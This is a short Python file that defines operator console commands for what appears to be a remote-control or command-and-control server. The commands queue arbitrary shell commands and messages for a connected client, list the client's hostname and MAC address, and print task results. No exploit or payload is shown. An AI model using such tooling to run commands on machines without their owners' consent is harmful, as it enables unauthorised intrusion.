def cmd_send(server, args):
    if not args:
        print("usage: send <msg>")
        return
    
    server.send_task("print_message", {
        "message": " ".join(args)
    })

def cmd_shell(server, args):
    if not args:
        print("usage: shell <cmd>")
        return
    
    server.send_task("shell", {
        "cmd": " ".join(args)
    })

def cmd_list(server, args):
    if not require_client(server):
        return
    
    c = server.client
    print(f"{c['hostname']} | {c['mac']}")

def cmd_results(server, args):
    if not require_client(server):
        return

    for tid, r in server.client["results"].items():
        print(f"{tid} [{r['status']}] -> {r['output']}")
    
def cmd_exit(server, args):
    print("bye")
    exit()

def cmd_help(server, args):
    print("available commands:")
    for name in COMMANDS:
        print(f"- {name}")
    
def require_client(server):
    if not server.client:
        print("no client")
        return False
    return True

COMMANDS = {
    "shell": cmd_shell,
    "list": cmd_list,
    "send": cmd_send,
    "results": cmd_results,
    "exit": cmd_exit,
    "help": cmd_help
}
